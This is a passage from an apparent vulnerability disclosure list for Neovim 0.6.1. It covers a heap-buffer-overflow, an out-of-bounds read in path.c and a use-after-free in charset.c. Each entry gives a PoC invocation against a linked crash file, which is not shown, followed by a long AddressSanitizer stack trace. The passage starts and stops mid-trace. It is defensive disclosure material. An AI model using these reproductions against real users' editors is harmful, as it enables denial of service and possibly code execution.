    #18 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #19 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #20 0xc69f10 in do_cmdline_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:288:10
    #21 0xfaf82e in exe_commands /root/vuln/nvims/neovim-0.6.1/src/nvim/main.c:1654:5
    #22 0xf9f023 in main /root/vuln/nvims/neovim-0.6.1/src/nvim/main.c:493:5
    #23 0x7f7881221d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #24 0x7f7881221e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #25 0x46a0c4 in _start (/root/vuln/nvims/neovim-0.6.1/build/bin/nvim+0x46a0c4)

0x6120000014ce is located 0 bytes to the right of 270-byte region [0x6120000013c0,0x6120000014ce)
allocated by thread T0 here:
    #0 0x4e4f8d in malloc (/root/vuln/nvims/neovim-0.6.1/build/bin/nvim+0x4e4f8d)
    #1 0x1114302 in try_malloc /root/vuln/nvims/neovim-0.6.1/src/nvim/memory.c:74:15
    #2 0x11144ec in xmalloc /root/vuln/nvims/neovim-0.6.1/src/nvim/memory.c:108:15
    #3 0xd581d3 in alloc_cmdbuff /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_getln.c:2614:20
    #4 0xd25699 in command_line_enter /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_getln.c:776:3
    #5 0xd240b9 in getcmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_getln.c:2406:20
    #6 0xd2b105 in getexline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_getln.c:2583:10
    #7 0xbec760 in ex_append /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:2978:17
    #8 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #9 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #10 0x1247fe8 in nv_colon /root/vuln/nvims/neovim-0.6.1/src/nvim/normal.c:4821:18
    #11 0x123389c in normal_execute /root/vuln/nvims/neovim-0.6.1/src/nvim/normal.c:1164:3
    #12 0x122be42 in normal_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/normal.c:8424:9
    #13 0xcbd6e0 in exec_normal /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:8732:5
    #14 0xcbd3ee in exec_normal_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:8715:3
    #15 0xcea50f in ex_normal /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:8641:7
    #16 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #17 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #18 0xc4ed63 in do_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:2242:5
    #19 0xc49dac in cmd_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1805:14
    #20 0xc4a4a3 in ex_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1786:3
    #21 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #22 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #23 0xc69f10 in do_cmdline_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:288:10
    #24 0xfaf82e in exe_commands /root/vuln/nvims/neovim-0.6.1/src/nvim/main.c:1654:5
    #25 0xf9f023 in main /root/vuln/nvims/neovim-0.6.1/src/nvim/main.c:493:5
    #26 0x7f7881221d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: heap-buffer-overflow (/root/vuln/nvims/neovim-0.6.1/build/bin/nvim+0x4e463b) in __asan_memset
Shadow bytes around the buggy address:
  0x0c247fff8240: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x0c247fff8250: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c247fff8260: 00 00 00 00 00 00 00 00 00 06 fa fa fa fa fa fa
  0x0c247fff8270: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x0c247fff8280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c247fff8290: 00 00 00 00 00 00 00 00 00[06]fa fa fa fa fa fa
  0x0c247fff82a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff82b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff82c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff82d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff82e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==3188033==ABORTING
```

# 21. Neovim <=0.6.1 Out-of-bounds Read in `src/nvim/path.c`

## Description
Neovim versions up to and including 0.6.1 are affected by a vulnerability where an out-of-bounds read occurs in the `path.c` file at line 634. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to attempt to read from an invalid memory address. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C220685](./C220685).
```sh
$ ./nvims/neovim-0.6.1/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C220685 -c :qa! 
AddressSanitizer:DEADLYSIGNAL
=================================================================
==3188157==ERROR: AddressSanitizer: SEGV on unknown address 0x7f7bd00c0a8c (pc 0x000001403ee5 bp 0x7fff3234e5b0 sp 0x7fff3234db20 T0)
==3188157==The signal is caused by a READ memory access.
    #0 0x1403ee5 in do_path_expand /root/vuln/nvims/neovim-0.6.1/src/nvim/path.c:634:27
    #1 0x13f5cab in path_expand /root/vuln/nvims/neovim-0.6.1/src/nvim/path.c:571:10
    #2 0x13f36d6 in gen_expand_wildcards /root/vuln/nvims/neovim-0.6.1/src/nvim/path.c:1301:32
    #3 0x13fea15 in expand_wildcards /root/vuln/nvims/neovim-0.6.1/src/nvim/path.c:2130:12
    #4 0x13fe8d6 in expand_wildcards_eval /root/vuln/nvims/neovim-0.6.1/src/nvim/path.c:2098:11
    #5 0xd40cdd in ExpandFromContext /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_getln.c:4912:11
    #6 0xd3cb32 in ExpandOne /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_getln.c:3964:9
    #7 0xca69ff in expand_filename /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:4546:11
    #8 0xc78ec1 in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1928:9
    #9 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #10 0xc4ed63 in do_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:2242:5
    #11 0xc49dac in cmd_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1805:14
    #12 0xc4a4a3 in ex_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1786:3
    #13 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #14 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #15 0xc69f10 in do_cmdline_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:288:10
    #16 0xfaf82e in exe_commands /root/vuln/nvims/neovim-0.6.1/src/nvim/main.c:1654:5
    #17 0xf9f023 in main /root/vuln/nvims/neovim-0.6.1/src/nvim/main.c:493:5
    #18 0x7f7bc9890d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #19 0x7f7bc9890e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #20 0x46a0c4 in _start (/root/vuln/nvims/neovim-0.6.1/build/bin/nvim+0x46a0c4)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /root/vuln/nvims/neovim-0.6.1/src/nvim/path.c:634:27 in do_path_expand
==3188157==ABORTING
```

# 22. Neovim <=0.6.1 Use-After-Free in `src/nvim/charset.c` 

## Description
Neovim versions up to and including 0.6.1 are affected by a vulnerability where a use-after-free occurs in the `charset.c` file at line 1163. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to read from a memory location that has already been freed. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition or potentially execute arbitrary code.

## PoC
poc at [C220413](./C220413).
```sh
$ ./nvims/neovim-0.6.1/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C220413 -c :qa! 
=================================================================
==3188104==ERROR: AddressSanitizer: heap-use-after-free on address 0x6060000016d6 at pc 0x00000047c236 bp 0x7ffea3ff86f0 sp 0x7ffea3ff7eb0
READ of size 3 at 0x6060000016d6 thread T0
    #0 0x47c235 in strlen (/root/vuln/nvims/neovim-0.6.1/build/bin/nvim+0x47c235)
    #1 0x80adcc in skipwhite /root/vuln/nvims/neovim-0.6.1/src/nvim/charset.c:1163:27
    #2 0xb5bcc3 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:474:10
    #3 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #4 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #5 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #6 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #7 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #8 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #9 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #10 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #11 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #12 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #13 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #14 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #15 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #16 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #17 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #18 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #19 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #20 0x927ea1 in eval0 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3351:9
    #21 0x92aa60 in eval_to_string /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:852:7
    #22 0x14935c0 in vim_regsub_both /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6769:23
    #23 0x1498418 in vim_regsub_multi /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6662:16
    #24 0xc17886 in do_sub /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:4058:20
    #25 0xc0b182 in ex_substitute /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:6016:11
    #26 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #27 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #28 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #29 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #30 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #31 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #32 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #33 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #34 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #35 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #36 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #37 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #38 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #39 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #40 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #41 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #42 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #43 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #44 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #45 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #46 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #47 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #48 0x927ea1 in eval0 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3351:9
    #49 0x92aa60 in eval_to_string /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:852:7
    #50 0x14935c0 in vim_regsub_both /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6769:23
    #51 0x1498418 in vim_regsub_multi /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6662:16
    #52 0xc17886 in do_sub /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:4058:20
    #53 0xc0b182 in ex_substitute /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:6016:11
    #54 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #55 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #56 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #57 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #58 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #59 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #60 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #61 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #62 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #63 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #64 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #65 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #66 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #67 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #68 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #69 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #70 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #71 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #72 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #73 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #74 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #75 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #76 0x927ea1 in eval0 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3351:9
    #77 0x92aa60 in eval_to_string /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:852:7
    #78 0x14935c0 in vim_regsub_both /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6769:23
    #79 0x1498418 in vim_regsub_multi /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6662:16
    #80 0xc17886 in do_sub /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:4058:20
    #81 0xc0b182 in ex_substitute /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:6016:11
    #82 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #83 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #84 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #85 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #86 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #87 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #88 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #89 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #90 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #91 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #92 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #93 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #94 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #95 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #96 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #97 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #98 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #99 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #100 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #101 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #102 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #103 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #104 0x927ea1 in eval0 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3351:9
    #105 0x92aa60 in eval_to_string /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:852:7
    #106 0x14935c0 in vim_regsub_both /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6769:23
    #107 0x1498418 in vim_regsub_multi /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6662:16
    #108 0xc17886 in do_sub /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:4058:20
    #109 0xc0b182 in ex_substitute /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:6016:11
    #110 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #111 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #112 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #113 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #114 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #115 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #116 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #117 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #118 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #119 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #120 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #121 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #122 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #123 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #124 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #125 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #126 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #127 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #128 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #129 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #130 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #131 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #132 0x927ea1 in eval0 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3351:9
    #133 0x92aa60 in eval_to_string /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:852:7
    #134 0x14935c0 in vim_regsub_both /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6769:23
    #135 0x1498418 in vim_regsub_multi /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6662:16
    #136 0xc17886 in do_sub /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:4058:20
    #137 0xc0b182 in ex_substitute /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:6016:11
    #138 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #139 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #140 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #141 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #142 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #143 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #144 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #145 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #146 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #147 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #148 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #149 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #150 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #151 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #152 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #153 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #154 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #155 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #156 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #157 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #158 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #159 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #160 0x927ea1 in eval0 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3351:9
    #161 0x92aa60 in eval_to_string /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:852:7
    #162 0x14935c0 in vim_regsub_both /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6769:23
    #163 0x1498418 in vim_regsub_multi /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6662:16
    #164 0xc17886 in do_sub /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:4058:20
    #165 0xc0b182 in ex_substitute /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:6016:11
    #166 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #167 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #168 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #169 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #170 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #171 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #172 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #173 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #174 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #175 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #176 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #177 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #178 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #179 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #180 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #181 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #182 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
